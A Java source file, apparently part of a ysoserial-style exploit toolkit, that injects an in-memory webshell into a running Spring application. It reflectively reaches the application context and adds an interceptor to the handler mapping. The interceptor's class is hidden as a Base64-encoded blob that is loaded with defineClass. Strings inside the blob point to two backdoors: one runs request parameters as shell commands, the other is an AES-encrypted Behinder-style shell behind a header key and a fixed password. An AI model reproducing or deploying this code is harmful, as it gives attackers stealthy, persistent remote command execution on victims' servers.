package ysoserial.template;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import sun.misc.BASE64Decoder;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.LinkedHashSet;

public class DFSSpringMemShell {
    public DFSSpringMemShell(){
        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                clazz = classLoader.loadClass("com.feihong.ldap.template.DynamicInterceptorTemplate");
            }catch(ClassNotFoundException e){
                try{
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADMBZQoAYQCnCACoCQBgAKkIAKoJAGAAqwgArAkAYACtCgBgAK4JAK8AsAgAsQoAsgCz\n" +
                        "CAC0CwC1ALYIALcKABQAuAsAuQC6CgAUALsJALwAvQgAvgcAvwgAwAgAwQgAwggAwwcAxAoAxQDG\n" +
                        "CgDFAMcKAMgAyQoAGQDKCADLCgAZAMwKABkAzQsAuQDOCgDPALMLALUA0AsAtQDRCADSCwC1ANMI\n" +
                        "ANQLANUA1ggA1woA2ADZBwDaBwDbCgAsAKcLANUA3AoALADdCADeCgAsAN8KACwA4AoAFADhCgAr\n" +
                        "AOIKANgA4wcA5AoANgCnCwC1AOUKAOYA5woANgDoCgDYAOkJAGAA6ggA6wcA7AcAeAcA7QoAPgDu\n" +
                        "BwDvCgDwAPEKAPAA8goA8wD0CgA+APUIAPYHAPcKAEgA+AgA+QoASAD6CACDCACBBwD7CgBOAPwI\n" +
                        "AP0KAEAA/gcA/woAQgEACQEBAQIHAQMKAD4BBAgBBQoA8wEGCgEBAQcHAQgKAFoA/AcBCQoAXAD8\n" +
                        "BwEKCgBeAPwHAQsHAQwBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEA\n" +
                        "EGJhc2ljQ21kU2hlbGxQd2QBABJMamF2YS9sYW5nL1N0cmluZzsBABNiZWhpbmRlclNoZWxsSGVh\n" +
                        "ZGVyAQAQYmVoaW5kZXJTaGVsbFB3ZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVy\n" +
                        "VGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTHlzb3NlcmlhbC90ZW1wbGF0ZS9E\n" +
                        "eW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZTsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQv\n" +
                        "aHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJl\n" +
                        "c3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsB\n" +
                        "AAZyZXN1bHQBAAFrAQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNz\n" +
                        "Qnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEABHZhcjgBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI5\n" +
                        "AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAV2YXIxMAEAE0xqYXZhL3V0aWwvSGFzaE1h\n" +
                        "cDsBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0\n" +
                        "cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0\n" +
                        "dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEADVN0YWNrTWFwVGFibGUHAL8HAQ0HAHIHAPsB\n" +
                        "AApFeGNlcHRpb25zAQAKaW5pdGlhbGl6ZQEABHZhcjcBACFMamF2YS9sYW5nL05vU3VjaE1ldGhv\n" +
                        "ZEV4Y2VwdGlvbjsBAAVjbGF6egEABm1ldGhvZAEABGNvZGUBAAVieXRlcwEAIkxqYXZhL2xhbmcv\n" +
                        "Q2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NM\n" +
                        "b2FkZXI7AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lP\n" +
                        "RXhjZXB0aW9uOwEABXZhcjExAQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRF\n" +
                        "eGNlcHRpb247BwELBwDtBwD/BwDsBwEOBwEDBwEIBwEJBwEKAQAKU291cmNlRmlsZQEAH0R5bmFt\n" +
                        "aWNJbnRlcmNlcHRvclRlbXBsYXRlLmphdmEBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQAr\n" +
                        "TG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAaABpAQAEcGFzcwwA\n" +
                        "ZABlAQAMWC1PcHRpb25zLUJpDABmAGUBABAyMDJjYjk2MmFjNTkwNzViDABnAGUMAIwAaQcBDwwB\n" +
                        "EAERAQAiWytdIER5bmFtaWMgSW50ZXJjZXB0b3Igc2F5cyBoZWxsbwcBEgwBEwEUAQAEdHlwZQcB\n" +
                        "FQwBFgEXAQAFYmFzaWMMAPYBGAcBGQwBGgEbDAEcAR0HAR4MAR8AZQEAAS8BABBqYXZhL2xhbmcv\n" +
                        "U3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQADY21kAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcBIAwB\n" +
                        "IQEiDAEjASQHASUMASYBJwwAaAEoAQACXEEMASkBKgwBKwEsDAEtAS4HAS8MATABFwwBMQEsAQAE\n" +
                        "UE9TVAwBMgEzAQABdQcBNAwBNQE2AQADQUVTBwENDAE3ATgBAB9qYXZheC9jcnlwdG8vc3BlYy9T\n" +
                        "ZWNyZXRLZXlTcGVjAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMATkBOgwBOwE8AQAADAE7AT0M\n" +
                        "AT4BLAwBPwFADABoAUEMAUIBQwEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAUQBRQcBRgwBRwEs\n" +
                        "DAFIAUkMAUoBSwwAYgBjAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBABVqYXZhL2xh\n" +
                        "bmcvQ2xhc3NMb2FkZXIMAUwBTQEAEGphdmEvbGFuZy9PYmplY3QHAU4MAU8BUAwBUQFSBwEODAFT\n" +
                        "AVQMAVUBVgEABmVxdWFscwEAEWphdmEvdXRpbC9IYXNoTWFwDABoARsBAAdzZXNzaW9uDAFXAVgB\n" +
                        "ABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFZAGkBACdjb20uZmVpaG9uZy5sZGFwLnRlbXBsYXRlLk15\n" +
                        "Q2xhc3NMb2FkZXIMAVoBWwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFcAV0H\n" +
                        "AV4MAV8AYwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAWABXQEDHHl2NjZ2Z0FB\n" +
                        "QURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZ\n" +
                        "UzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlX\n" +
                        "SnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNsTVkyOXRMMlpsYVdo\n" +
                        "dmJtY3ZiR1JoY0M5MFpXMXdiR0YwWlM5TmVVTnNZWE56VEc5aFpHVnlPd0VBQVdNQkFCZE1hbUYy\n" +
                        "WVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUMyUmxabWx1WlVOc1lYTnpBUUFzS0Z0Q1RHcGhk\n" +
                        "bUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFWaWVY\n" +
                        "Umxjd0VBQWx0Q0FRQUxZMnhoYzNOTWIyRmtaWElCQUFwVGIzVnlZMlZHYVd4bEFRQVNUWGxEYkdG\n" +
                        "emMweHZZV1JsY2k1cVlYWmhEQUFHQUFjQkFDZGpiMjB2Wm1WcGFHOXVaeTlzWkdGd0wzUmxiWEJz\n" +
                        "WVhSbEwwMTVRMnhoYzNOTWIyRmtaWElNQUE4QUdnRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZ\n" +
                        "V1JsY2dFQUZ5aGJRa2xKS1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QUNFQUFnQUZBQUFBQUFBQ0FB\n" +
                        "QUFCZ0FIQUFFQUNBQUFBRG9BQWdBQ0FBQUFCaW9ydHdBQnNRQUFBQUlBQ1FBQUFBWUFBUUFBQUFR\n" +
                        "QUNnQUFBQllBQWdBQUFBWUFDd0FNQUFBQUFBQUdBQTBBRGdBQkFBa0FEd0FRQUFFQUNBQUFBRVFB\n" +
                        "QkFBQ0FBQUFFTHNBQWxrcnR3QURLZ01xdnJZQUJMQUFBQUFDQUFrQUFBQUdBQUVBQUFBSUFBb0FB\n" +
                        "QUFXQUFJQUFBQVFBQkVBRWdBQUFBQUFFQUFUQUE0QUFRQUJBQlFBQUFBQ0FCVT0MAWEBYgwBYwFk\n" +
                        "AQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9u\n" +
                        "AQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEALXlzb3Nlcmlh\n" +
                        "bC90ZW1wbGF0ZS9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZQEAQW9yZy9zcHJpbmdmcmFtZXdv\n" +
                        "cmsvd2ViL3NlcnZsZXQvaGFuZGxlci9IYW5kbGVySW50ZXJjZXB0b3JBZGFwdGVyAQATamF2YXgv\n" +
                        "Y3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9TeXN0\n" +
                        "ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAH\n" +
                        "cHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRw\n" +
                        "U2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZh\n" +
                        "L2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAJmphdmF4L3NlcnZsZXQvaHR0\n" +
                        "cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJc2V0U3RhdHVzAQAEKEkpVgEAB2lzRW1wdHkBAAMoKVoB\n" +
                        "AAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRp\n" +
                        "bWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzsp\n" +
                        "TGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0B\n" +
                        "ABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVz\n" +
                        "ZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5l\n" +
                        "eHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRX\n" +
                        "cml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEACmdl\n" +
                        "dFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2Vy\n" +
                        "dmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5n\n" +
                        "O0xqYXZhL2xhbmcvT2JqZWN0OylWAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7\n" +
                        "KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmlu\n" +
                        "ZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2\n" +
                        "YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0\n" +
                        "cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5n\n" +
                        "L1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEA\n" +
                        "GigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJl\n" +
                        "YWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwB\n" +
                        "AAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEv\n" +
                        "bGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFk\n" +
                        "AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNz\n" +
                        "TG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5n\n" +
                        "L09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3Rh\n" +
                        "bmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGph\n" +
                        "dmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEACWxv\n" +
                        "YWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFz\n" +
                        "cwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRT\n" +
                        "dXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFu\n" +
                        "Zy9JbnRlZ2VyOwAhAGAAYQAAAAQAAgBiAGMAAAACAGQAZQAAAAIAZgBlAAAAAgBnAGUAAAADAAEA\n" +
                        "aABpAAEAagAAAFkAAgABAAAAGyq3AAEqEgK1AAMqEgS1AAUqEga1AAcqtwAIsQAAAAIAawAAABoA\n" +
                        "BgAAABoABAAWAAoAFwAQABgAFgAbABoAHABsAAAADAABAAAAGwBtAG4AAAABAG8AcAACAGoAAANC\n" +
                        "AAcACwAAAc6yAAkSCrYACysSDLkADQIAxgCZKxIMuQANAgASDrYAD5kAiSsqtAADuQANAgA6BCwR\n" +
                        "AMi5ABACABkExgGSGQS2ABGaAYoBOgWyABISE7YAD5kAGwa9ABRZAxIVU1kEEhZTWQUZBFM6BqcA\n" +
                        "GAa9ABRZAxIXU1kEEhhTWQUZBFM6BrsAGVm4ABoZBrYAG7YAHLcAHRIetgAftgAgOgcsuQAhAQAZ\n" +
                        "B7YAIgOsKyq0AAW5ACMCAMYBGSu5ACQBABIltgAPmQEBLBEAyLkAEAIAKrQABzoEK7kAJgEAEicZ\n" +
                        "BLkAKAMAEim4ACo6BRkFBbsAK1m7ACxZtwAtK7kAJgEAEie5AC4CALYALxIwtgAxtgAytgAzEim3\n" +
                        "ADS2ADUZBbsANlm3ADcruQA4AQC2ADm2ADq2ADs6Biq0ADwSPQW9AD5ZAxMAP1NZBBMAQFO2AEEB\n" +
                        "wABCBb0AQlkDGQZTWQS4AEO2AERTtgBFwAA+OgcZB7YARjoIGQcSRwS9AD5ZAxMAQlO2AEE6CbsA\n" +
                        "SFkGtwBJOgoZChJKK7kAJgEAtgBLVxkKEkwstgBLVxkKEk0rtgBLVxkJGQgEvQBCWQMZClO2AEVX\n" +
                        "A6ynAAo6BhkGtgBPBKwAAQC2AcEBxQBOAAMAawAAAIYAIQAAAB8ACAAiACMAIwAvACQAOAAlAEUA\n" +
                        "JgBIACgAUwApAGsAKwCAAC4AnAAvAKcAMACpADIAtgA0AMQANQDNADYA0wA3AOIAOADpADkBGgA6\n" +
                        "ATQAOwFrADwBcgA9AYUAPgGPAD8BnQBAAaYAQQGvAEIBwABDAcIARwHFAEUBxwBGAcwASgBsAAAA\n" +
                        "rAARAGgAAwBxAHIABgCAACkAcQByAAYAnAANAHMAZQAHAC8AegB0AGUABABIAGEAdQB2AAUBNACO\n" +
                        "AHcAeAAGAWsAVwB5AGMABwFyAFAAegB7AAgBhQA9AHwAfQAJAY8AMwB+AH8ACgDTAO8AdABlAAQA\n" +
                        "6QDZAHUAdgAFAccABQB+AIAABgAAAc4AbQBuAAAAAAHOAIEAggABAAABzgCDAIQAAgAAAc4AhQB7\n" +
                        "AAMAhgAAABwABv0AawcAhwcAiPwAFAcAifgAKPsBGEIHAIoGAIsAAAAEAAEATgACAIwAaQABAGoA\n" +
                        "AAIFAAcABwAAAKu4AEO2AERMKisSULYAUbUAPKcAgU0rtgBTTgE6BBkExwA1LRMAQqUALi0SPQa9\n" +
                        "AD5ZAxMAP1NZBLIAVFNZBbIAVFO2AEE6BKf/1joFLbYAVk6n/8wSVzoFuwA2WbcANxkFtgA6OgYZ\n" +
                        "BAS2AFgqGQQrBr0AQlkDGQZTWQQDuABZU1kFGQa+uABZU7YARcAAPrUAPKcAGEwrtgBbpwAQTCu2\n" +
                        "AF2nAAhMK7YAX7EABQAHABEAFABSACkARwBKAFUAAACSAJUAWgAAAJIAnQBcAAAAkgClAF4AAwBr\n" +
                        "AAAAagAaAAAATwAHAFIAEQBjABQAUwAVAFQAGgBVAB0AVwApAFkARwBcAEoAWgBMAFsAUQBcAFQA\n" +
                        "XwBYAGAAZgBhAGwAYgCSAGoAlQBkAJYAZQCaAGoAnQBmAJ4AZwCiAGoApQBoAKYAaQCqAGwAbAAA\n" +
                        "AHAACwBMAAUAjQCOAAUAGgB4AI8AYwADAB0AdQCQAH0ABABYADoAkQBlAAUAZgAsAJIAeAAGABUA\n" +
                        "fQB6AJMAAgAHAIsAlACVAAEAlgAEAHwAlgABAJ4ABAB+AJcAAQCmAAQAmACZAAEAAACrAG0AbgAA\n" +
                        "AIYAAAA6AAn/ABQAAgcAmgcAmwABBwCc/gAIBwCcBwCdBwCebAcAnwn/AD0AAQcAmgAAQgcAoEcH\n" +
                        "AKFHBwCiBAACAKMAAAACAKQApQAAAAYAAQCmAAA=";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                    System.out.println("Add interceptor...");
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }
            adaptedInterceptors.add(clazz.newInstance());
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
